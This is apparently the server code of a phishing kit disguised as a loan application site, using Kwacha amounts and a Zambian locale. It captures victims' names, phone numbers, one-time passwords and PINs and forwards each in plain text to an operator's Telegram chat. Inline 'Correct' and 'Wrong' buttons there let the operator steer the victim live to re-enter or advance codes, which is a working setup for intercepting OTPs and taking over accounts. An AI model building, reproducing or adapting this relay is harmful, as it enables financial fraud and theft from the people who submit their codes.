const express = require('express');
const http = require('http');
const https = require('https');
const { WebSocketServer, WebSocket } = require('ws');

// ═══════════════════════════════════════════
// CONFIG (from Render environment variables)
// ═══════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════
const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(express.static(__dirname));
app.use(express.json());

const sessions = {};

// ═══════════════════════════════════════════
// WEBSOCKET
// ═══════════════════════════════════════════
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://localhost:' + PORT);
    const sessionId = url.searchParams.get('session');

    if (sessionId && sessions[sessionId]) {
        sessions[sessionId].ws = ws;
        console.log('WS connected:', sessions[sessionId].name, sessionId);
    } else {
        console.log('WS connected, no session:', sessionId);
    }

    ws.on('close', () => {
        if (sessionId && sessions[sessionId]) {
            sessions[sessionId].ws = null;
            console.log('WS disconnected:', sessions[sessionId].name);
        }
    });
});

// ═══════════════════════════════════════════
// TELEGRAM HTTPS HELPER
// ═══════════════════════════════════════════
function tgRequest(method, path, body) {
    return new Promise((resolve, reject) => {
        const payload = body ? JSON.stringify(body) : null;
        const opts = { method, hostname: 'api.telegram.org', path };
        if (payload) {
            opts.headers = {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            };
        }
        const req = https.request(opts, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch (e) { resolve({ ok: false, raw: data }); }
            });
        });
        req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
        req.on('error', reject);
        if (payload) req.write(payload);
        req.end();
    });
}

function sendTelegram(text, buttons) {
    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', body)
        .then(res => {
            if (res.ok) console.log('TG sent');
            else console.error('TG error:', JSON.stringify(res));
        })
        .catch(err => console.error('Network:', err.message));
}

function answerCallback(cqId, text) {
    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
        callback_query_id: cqId,
        text: text
    });
}

// ═══════════════════════════════════════════
// PAGE 1: Application (no buttons)
// ═══════════════════════════════════════════
app.post('/api/apply', async (req, res) => {
    const { name, phone, amount, period } = req.body;

    if (!name || !phone || !amount || !period) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const interest = Math.round(amount * 0.0013 * period);
    const total = amount + interest;

    sessions[sessionId] = {
        ws: null,
        name, phone, amount, period,
        otp: '', pin: '',
        otpVerified: false, pinVerified: false,
        otpDecision: null, otpDecisionSent: false,
        pinDecision: null, pinDecisionSent: false
    };

    const msg = 'NEW LOAN APPLICATION\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Name: ' + name + '\n' +
        'Phone: ' + phone + '\n' +
        'Amount: K' + amount.toLocaleString() + '\n' +
        'Period: ' + period + ' days\n' +
        'Interest: K' + interest.toLocaleString() + '\n' +
        'Total Repay: K' + total.toLocaleString() + '\n' +
        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━';

    await sendTelegram(msg);
    res.json({ success: true, sessionId });
});

// ═══════════════════════════════════════════
// PAGE 2: OTP (4 digits, with admin buttons)
// ═══════════════════════════════════════════
app.post('/api/otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    const session = sessions[sessionId];

    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.otp = otp;
    session.otpVerified = false;
    session.otpDecision = null;
    session.otpDecisionSent = false;

    const msg = 'OTP SUBMITTED\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Name: ' + session.name + '\n' +
        'Phone: ' + session.phone + '\n' +
        'Amount: K' + session.amount.toLocaleString() + '\n' +
        'Period: ' + session.period + ' days\n' +
        'OTP: ' + otp + '\n' +
        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Tap below to verify';

    const buttons = [[
        { text: 'Correct OTP', callback_data: 'otp_correct:' + sessionId },
        { text: 'Wrong OTP', callback_data: 'otp_wrong:' + sessionId }
    ]];

    await sendTelegram(msg, buttons);
    res.json({ success: true, waiting: true });
});

// ═══════════════════════════════════════════
// PAGE 3: PIN (5 digits, with admin buttons)
// ═══════════════════════════════════════════
app.post('/api/pin', async (req, res) => {
    const { sessionId, pin } = req.body;
    const session = sessions[sessionId];

    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.pin = pin;
    session.pinVerified = false;
    session.pinDecision = null;
    session.pinDecisionSent = false;

    const msg = 'PIN SUBMITTED\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Name: ' + session.name + '\n' +
        'Phone: ' + session.phone + '\n' +
        'PIN: ' + pin + '\n' +
        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Tap below to verify';

    const buttons = [[
        { text: 'Correct PIN', callback_data: 'pin_correct:' + sessionId },
        { text: 'Wrong PIN', callback_data: 'pin_wrong:' + sessionId }
    ]];

    await sendTelegram(msg, buttons);
    res.json({ success: true, waiting: true });
});

// ═══════════════════════════════════════════
// POLLING FALLBACK (for when WebSocket drops on mobile)
// ═══════════════════════════════════════════
app.get('/api/check', (req, res) => {
    const { sessionId } = req.query;
    const session = sessions[sessionId];

    if (!session) {
        return res.json({ status: 'not_found' });
    }

    if (session.otpDecision && !session.otpDecisionSent) {
        session.otpDecisionSent = true;
        return res.json({ status: 'decision', type: 'otp_result', result: session.otpDecision });
    }

    if (session.pinDecision && !session.pinDecisionSent) {
        session.pinDecisionSent = true;
        return res.json({ status: 'decision', type: 'pin_result', result: session.pinDecision });
    }

    res.json({ status: 'waiting' });
});

// ═══════════════════════════════════════════
// TELEGRAM POLLING (handles button clicks)
// ═══════════════════════════════════════════
let offset = 0;

async function pollTelegram() {
    try {
        const data = await tgRequest('GET', '/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + offset + '&timeout=0');

        if (data.ok) {
            for (const update of data.result) {
                offset = update.update_id + 1;

                if (!update.callback_query) continue;

                const cq = update.callback_query;
                const parts = cq.data.split(':');
                const action = parts[0] + '_' + parts[1];
                const sessionId = parts.slice(2).join(':');
                const session = sessions[sessionId];

                if (!session) {
                    console.log('Unknown session:', sessionId);
                    await answerCallback(cq.id, 'Session expired. Please re-apply.');
                    continue;
                }

                // ─── OTP CORRECT ───
                if (action === 'otp_correct') {
                    session.otpDecision = 'correct';
                    session.otpDecisionSent = false;

                    await answerCallback(cq.id, 'OTP Approved!');

                    await sendTelegram(
                        'OTP VERIFIED\n' +
                        '━━━━━━━━━━━━━━━━━━\n' +
                        'Name: ' + session.name + '\n' +
                        'Phone: ' + session.phone + '\n' +
                        'OTP: ' + session.otp + '\n' +
                        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
                        '━━━━━━━━━━━━━━━━━━\n' +
                        'User moving to PIN verification'
                    );

                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                        session.ws.send(JSON.stringify({ type: 'otp_result', result: 'correct' }));
                        session.otpDecisionSent = true;
                    }

                    console.log('OTP CORRECT:', session.name, session.otp);

                // ─── OTP WRONG ───
                } else if (action === 'otp_wrong') {
                    session.otpDecision = 'wrong';
                    session.otpDecisionSent = false;

                    await answerCallback(cq.id, 'OTP Rejected. User notified.');

                    await sendTelegram(
                        'OTP REJECTED\n' +
                        '━━━━━━━━━━━━━━━━━━\n' +
                        'Name: ' + session.name + '\n' +
                        'Phone: ' + session.phone + '\n' +
                        'OTP: ' + session.otp + '\n' +
                        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
                        '━━━━━━━━━━━━━━━━━━\n' +
                        'User asked to re-enter OTP'
                    );

                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                        session.ws.send(JSON.stringify({ type: 'otp_result', result: 'wrong' }));
                        session.otpDecisionSent = true;
                    }

                    console.log('OTP WRONG:', session.name, session.otp);

                // ─── PIN CORRECT ───
                } else if (action === 'pin_correct') {
                    session.pinDecision = 'correct';
                    session.pinDecisionSent = false;

                    await answerCallback(cq.id, 'PIN Approved! Application complete.');

                    await sendTelegram(
                        'APPLICATION COMPLETE\n' +
                        '━━━━━━━━━━━━━━━━━━\n' +
                        'Name: ' + session.name + '\n' +
                        'Phone: ' + session.phone + '\n' +
                        'Amount: K' + session.amount.toLocaleString() + '\n' +
                        'Period: ' + session.period + ' days\n' +
                        'PIN: ' + session.pin + '\n' +
                        'OTP: ' + session.otp + '\n' +
                        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
                        '━━━━━━━━━━━━━━━━━━\n' +
                        'All verified. Application submitted.'
                    );

                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                        session.ws.send(JSON.stringify({ type: 'pin_result', result: 'correct' }));
                        session.pinDecisionSent = true;
                    }

                    console.log('PIN CORRECT:', session.name, 'COMPLETE');

                // ─── PIN WRONG ───
                } else if (action === 'pin_wrong') {
                    session.pinDecision = 'wrong';
                    session.pinDecisionSent = false;

                    await answerCallback(cq.id, 'PIN Rejected. User notified.');

                    await sendTelegram(
                        'PIN REJECTED\n' +
                        '━━━━━━━━━━━━━━━━━━\n' +
                        'Name: ' + session.name + '\n' +
                        'Phone: ' + session.phone + '\n' +
                        'PIN: ' + session.pin + '\n' +
                        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
                        '━━━━━━━━━━━━━━━━━━\n' +
                        'User asked to re-enter PIN'
                    );

                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                        session.ws.send(JSON.stringify({ type: 'pin_result', result: 'wrong' }));
                        session.pinDecisionSent = true;
                    }

                    console.log('PIN WRONG:', session.name, session.pin);
                }
            }
        }
    } catch (err) {
        if (err.message !== 'timeout') console.error('Polling error:', err.message);
    }
    setTimeout(pollTelegram, 2000);
}

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
server.listen(PORT, () => {
    console.log('');
    console.log('Server running on port ' + PORT);
    console.log('WebSocket: /ws');
    console.log('Telegram polling started');
    console.log('Token set:', TELEGRAM_BOT_TOKEN ? 'YES' : 'NO (check env vars)');
    console.log('Chat ID:', TELEGRAM_CHAT_ID || 'NOT SET');
    console.log('');
    pollTelegram();
});   
